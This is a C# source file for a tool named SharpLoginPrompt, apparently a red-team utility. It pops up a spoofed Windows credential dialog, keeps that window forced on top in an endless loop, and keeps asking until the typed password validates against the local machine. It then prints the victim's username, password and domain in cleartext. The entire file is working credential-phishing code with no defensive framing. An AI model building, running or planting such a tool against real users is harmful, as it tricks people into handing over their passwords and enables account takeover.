using System;
using System.Net;
using System.DirectoryServices.AccountManagement;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;
using System.Windows;

namespace SharpLoginPrompt
{
    class Program
    {
        private static List<IntPtr> _results = new List<IntPtr>();
        static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        const UInt32 SWP_NOSIZE = 0x0001;
        const UInt32 SWP_NOMOVE = 0x0002;
        const UInt32 SWP_SHOWWINDOW = 0x0040;
        const UInt32 SWP_NOZORDER = 0x0004;
        const UInt32 SWP_NOSENDCHANGING = 0x0400;
        const UInt32 SWP_NOREPOSITION = 0x0200;
        static int a = (int)(SystemParameters.PrimaryScreenHeight) / 2;
        static int b = (int)(SystemParameters.PrimaryScreenWidth) / 2;

        private const int SW_MAXIMIZE = 3;
        private const int SW_MINIMIZE = 6;
        [DllImport("user32.dll")]
        public static extern int GetWindowThreadProcessId(IntPtr handle, out int processId);
        [DllImport("user32.dll")]
        static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("ole32.dll")]
        public static extern void CoTaskMemFree(IntPtr ptr);
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct CREDUI_INFO
        {
            public int cbSize;
            public IntPtr hwndParent;
            public string pszMessageText;
            public string pszCaptionText;
            public IntPtr hbmBanner;
        }
        [DllImport("credui.dll", CharSet = CharSet.Auto)]
        private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere, int authError, ref uint authPackage, IntPtr InAuthBuffer, uint InAuthBufferSize, out IntPtr refOutAuthBuffer, out uint refOutAuthBufferSize, ref bool fSave, int flags);

        [DllImport("credui.dll", CharSet = CharSet.Auto)]
        private static extern bool CredUnPackAuthenticationBuffer(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);
        [DllImport("user32.Dll")]
        private static extern int EnumWindows(EnumWindowsProc x, int y);
        private static int WindowEnum(IntPtr hWnd, int lParam)
        {
            int processID = 0;
            int threadID = GetWindowThreadProcessId(hWnd, out processID);
            if (threadID == lParam) _results.Add(hWnd);
            return 1;
        }

        public static string GetTextfromwindow(IntPtr hWnd)
        {
            // Allocate correct string length first
            int length = GetWindowTextLength(hWnd);
            StringBuilder sb = new StringBuilder(length + 1);
            GetWindowText(hWnd, sb, sb.Capacity);
            return sb.ToString();
        }

        delegate bool EnumThreadDelegate(IntPtr hWnd, IntPtr lParam);
        enum ShowWindowCommands
        {

            Hide = 0,

            Normal = 1,

            ShowMinimized = 2,

            Maximize = 3,
            ShowMaximized = 3,

            ShowNoActivate = 4,

            Show = 5,

            Minimize = 6,

            ShowMinNoActive = 7,

            ShowNA = 8,

            Restore = 9,

            ShowDefault = 10,

            ForceMinimize = 11
        }

        private delegate int EnumWindowsProc(IntPtr hwnd, int lParam);



        private static IntPtr[] GetWindowHandlesForThread(int threadHandle)
        {
            _results.Clear();
            EnumWindows(WindowEnum, threadHandle);
            return _results.ToArray();
        }

        private static void TopWindow()
        {
            Thread t1 = new Thread(() =>
            {
                while (true)
                {
                    Process procesInfo = Process.GetCurrentProcess();
                    IntPtr handle = procesInfo.MainWindowHandle;
                    SetWindowPos(handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW | SWP_NOSENDCHANGING | SWP_NOREPOSITION);
                    
                }

            });
            t1.Start();
        }


        static void Main(string[] args)
        {

            TopWindow();
            try
            {
                bool passwordOk = false;
                while (passwordOk != true)
                {

                    CREDUI_INFO credui = new CREDUI_INFO();
                    credui.pszCaptionText = args.Length == 2 ? args[0] : "Please enter the credentials";
                    credui.pszMessageText = args.Length == 2 ? args[1] : "Domain: " + (Environment.GetEnvironmentVariable("USERDOMAIN").ToString() ?? Environment.GetEnvironmentVariable("HOSTNAME").ToString());
                    credui.cbSize = Marshal.SizeOf(credui);
                    IntPtr outCredBuffer = new IntPtr();
                    uint outCredSize;
                    bool save = false;
                    uint authPackage = 0;
                    int result = CredUIPromptForWindowsCredentials(ref credui, 0, ref authPackage, IntPtr.Zero, 0, out outCredBuffer, out outCredSize, ref save, 0x1 /* Generic */);
                    var usernameBuf = new StringBuilder(100);
                    var passwordBuf = new StringBuilder(100);
                    var domainBuf = new StringBuilder(100);

                    int maxUserName = 100;
                    int maxDomain = 100;
                    int maxPassword = 100;
                    if (result == 0)
                    {
                        if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName,
                                                           domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
                        {
                            CoTaskMemFree(outCredBuffer);
                            NetworkCredential networkCredential = new NetworkCredential()
                            {
                                UserName = usernameBuf.ToString(),
                                Password = passwordBuf.ToString(),
                                Domain = domainBuf.ToString()


                            };
                            Console.WriteLine("Username = " + networkCredential.UserName);
                            Console.WriteLine("Password = " + networkCredential.Password);
                            Console.WriteLine("Doamain = " + networkCredential.Domain);
                            string userName;
                            if (networkCredential.UserName.ToString().Contains("\\"))
                            {
                                userName = networkCredential.UserName.ToString();
                            }
                            else
                            {
                                userName = (Environment.GetEnvironmentVariable("USERDOMAIN").ToString() ?? Environment.GetEnvironmentVariable("HOSTNAME").ToString()) + "\\" + networkCredential.UserName.ToString();
                            }
                            Console.WriteLine(userName);
                            try
                            {
                                PrincipalContext pcon = new PrincipalContext(ContextType.Machine, Environment.MachineName);
                                passwordOk = pcon.ValidateCredentials(userName, networkCredential.Password);
                                Console.WriteLine(passwordOk);
                            }
                            catch (System.DirectoryServices.AccountManagement.PrincipalOperationException)
                            {
                                passwordOk = false;
                                Console.WriteLine("Trying Again");
                            }


                        }
                    }
                }
            }
            catch (Exception)
            {
                Console.WriteLine("Something Went Wrong");
            }
            System.Environment.Exit(0);
        }
    }
}
